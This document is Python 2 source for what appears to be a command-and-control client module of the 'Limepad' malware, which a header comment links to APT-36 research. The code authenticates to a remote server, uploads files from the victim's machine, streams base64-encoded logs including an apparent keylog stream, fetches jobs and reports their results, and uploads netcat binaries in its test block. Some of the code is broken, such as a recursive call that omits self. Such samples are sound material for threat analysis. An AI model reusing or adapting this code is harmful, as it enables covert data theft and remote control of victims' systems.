# module used by Limepad
# reference blog: https://www.zscaler.com/blogs/security-research/new-and-improved-ttps-apt-36-targeting-indian-governmental-organizations
import os, urllib, urllib2, socket, base64, sys, json, controls, logging
billet = logging.getLogger('Limepad')
REMOTE_API_VERSION = '14.5'

class RHandler:
    """
    TODO: Write some description here
    """

    def __init__(self, host, userid, sharedkey, port=80):
        self.userid = userid
        self.sharedkey = sharedkey
        self.host = host
        self.port = port
        print 'all objects initialized'

    def sync(self, localpath):
        """
        Tries to sync a local file with remote server
        """
        rpath = self._local_remote_path_trans(localpath)
        filestate = self.get_file(rpath)
        return True

    def _create_request(self, method, url_path, params):
        assert method in ('GET', 'POST'), "Only 'GET', 'DELETE' and 'POST' are allowed for method."
        url = 'http://%s/%s/%s' % (self.host, REMOTE_API_VERSION, url_path.lstrip('/'))
        if method == 'GET':
            url = url + '?' + urllib.urlencode(params)
            params = None
        else:
            params = urllib.urlencode(params)
        headers = self._auth_headers()
        return (url, headers, params)

    def _create_request_filetransfer(self, method, url_path, params):
        assert method in ('GET', 'POST'), "Only 'GET', 'DELETE' and 'POST' are allowed for method."
        url = 'http://%s/%s/%s' % (self.host, REMOTE_API_VERSION, url_path.lstrip('/'))
        if method == 'GET':
            url = url + '?' + urllib.urlencode(params)
            params = None
        else:
            params = url + '?password=' + self.sharedkey
        headers = self._auth_headers()
        return (url, headers, params)

    def open_request(self, method, url, params, headers=None):
        try:
            if not headers:
                headers = dict()
            url, auth_headers, params = self._create_request(method, url, params)
            headers.update(auth_headers)
            request = urllib2.Request(url, params, headers)
            return urllib2.urlopen(request)
        except Exception as e:
            print 'pass through open_request exception1'
        except urllib2.HTTPError as e:
            print 'http error caught by us on urllib21'
            open_request(method, url, params)

    def verify(self):
        try:
            print 'before getting to information page'
            params = {'USERNAME': self.userid, 'PASSWORD': self.sharedkey}
            resp = self.open_request('GET', '/information.php/', params)
            status = resp.code
            resp.close()
            if str(status) == '200':
                return True
            return False
        except urllib2.HTTPError as e:
            return False
        except urllib2.URLError as e:
            raise e
        except Exception as e:
            return False

    def _auth_headers(self):
        return {'USERNAME': self.userid, 'AUTH_TOKEN': self.sharedkey}

    def send_files(self, local_path, filenames, remote_path=None, params=None):
        import poster
        opener = poster.streaminghttp.register_openers()
        if params is None:
            params = dict()
        abacus = []
        try:
            if type(filenames) is str:
                filenames = [
                 filenames]
            if type(filenames) is unicode:
                filenames = filenames
            if remote_path is None:
                remote_path = self._local_remote_path_trans(local_path)
            url, headers, params = self._create_request('POST', '/adjustfile.php/' + remote_path, params)
            params = {'USERNAME': self.userid, 'PASSWORD': self.sharedkey}
            for f in filenames:
                n = f.decode('utf-8')
                upload_files = [(n, open(local_path + '\\' + n, 'rb'))]
                data, mp_headers = poster.encode.multipart_encode(upload_files)
                headers.update(mp_headers)
                request = urllib2.Request(url, data, headers)
                resp = urllib2.urlopen(request)

            try:
                resp_str = resp.read()
                resp_json = json.loads(resp_str)
            except Exception as e:
                return False

            return len(resp_json['failed']) == 0
        except Exception as e:
            raise e

        return

    def ping(self):
        print 'pinging ping pong'
        s = socket.socket()
        try:
            s.connect((self.host, self.port))
            s.close()
        except Exception as e:
            print 'excpeion in socket sonnectivity'
            return False

        print 'pinging ping1 pong2'
        try:
            resp = self.open_request('GET', '/bind.php', {})
            if 'pong!' in resp.read():
                print 'Connection connected  *********'
                return True
            print 'false return by ping pong'
            return False
        except Exception as e:
            print 'exception in ' + str(e)
            return False

    def send_log_stream(self, logname, data):
        """ Updates a continous stream on the server """
        try:
            logname = urllib.quote(logname)
            resp = self.open_request('POST', '/chunk.php/%s/' % logname, {'data': base64.encodestring(data)})
            billet.debug('Log response: %s' % resp.read())
        except Exception as e:
            billet.exception(e)
            return False

        return True

    def get_file(self, rpath):
        """ Returns a stream reader """
        return self.open_request('GET', '/adjustfile.php/' + rpath.lstrip('/'), {})

    def get_job(self):
        try:
            params = {'USERNAME': self.userid, 'PASSWORD': self.sharedkey}
            resp = self.open_request('GET', '/action.php/', params).read()
            billet.debug('job request response received:' + resp)
            return json.loads(resp)
        except Exception as e:
            billet.exception(e)
            return

        return

    def ack_job(self, id, res):
        try:
            resp = self.open_request('POST', '/action.php/', {'id': id, 'result': base64.encodestring(res), 'USERNAME': self.userid})
            billet.debug('Job ack response: %s' % resp.read())
        except Exception as e:
            billet.exception(e)

    def _local_remote_path_trans(self, localpath):
        r""" Converts local path to remote path e.g. c:     emp\hello.txt to /c/temp/hello.txt """
        if os.sys.platform == 'win32':
            drive, localpath = os.path.splitdrive(localpath)
            return '%s/%s' % (drive[0], urllib.quote(localpath.replace('\\', '/').lstrip('/')))
        raise 'Not implemented'

    def _remote_local_path_trans(self, rpath):
        r""" Converts remoet path to local path e.g. /c/temp/hello.txt to c:        emp\hello.txt """
        if os.sys.platform == 'win32':
            split_rpath = rpath.lstrip('/').split('/')
            drive = split_rpath[0]
            lpath = urllib.unquote(('\\').join(split_rpath[1:]))
            return '%s:%s' % (drive, lpath)
        raise 'Now implemented'
        return '%s/%s' % (drive, lpath.replace('\\', '/'))


if __name__ == '__main__':
    conn = RHandler('localhost', 'testuser', 'testuser')
    import time
    conn.verify()
    conn.send_files('c:\\temp', ['test.o', 'nc.py', 'pdcurses.dll'])
    conn.send_files('c:\\bin\\', 'nc.exe')
    conn.send_log_stream('klog', time.ctime())
